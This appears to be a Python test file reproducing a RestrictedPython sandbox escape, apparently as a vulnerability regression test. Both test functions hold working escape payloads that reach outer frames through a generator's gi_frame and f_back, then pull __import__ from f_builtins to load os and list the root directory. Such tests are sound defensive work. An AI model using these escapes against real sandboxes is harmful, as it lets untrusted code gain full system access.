from RestrictedPython import compile_restricted
from RestrictedPython import safe_globals


def test_1():
    source_code = """
g = None
leak = None

def test():
    global g, leak
    leak = g.gi_frame.f_back.f_back
    yield leak

g = test()
g.send(None)
os = leak.f_builtins.get('__import__')('os')

result = os.listdir('/')

# for visualization that it works -
# original example does not have a print on the listdir result
# but this should not affect the vulnerability
leak.f_builtins.get('print')(result)
    """
    byte_code = compile_restricted(source_code, '<inline>', 'exec')
    exec(byte_code, safe_globals, {})


def test_2():
    from RestrictedPython import Eval
    from RestrictedPython import compile_restricted
    from RestrictedPython import safe_globals
    from RestrictedPython import utility_builtins
    policy_globals = {**safe_globals, **utility_builtins}
    policy_globals['_getiter_'] = Eval.default_guarded_getiter
    policy_globals['_getitem_'] = Eval.default_guarded_getitem

    source_code = """
q = (q.gi_frame.f_back.f_back.f_back for _ in (1,))
[x for x in q][0].f_builtins['__import__']('os').listdir('/')
"""
    byte_code = compile_restricted(
        source_code,
        filename="<string>",
        mode="exec",
    )
    exec(byte_code, policy_globals, None)
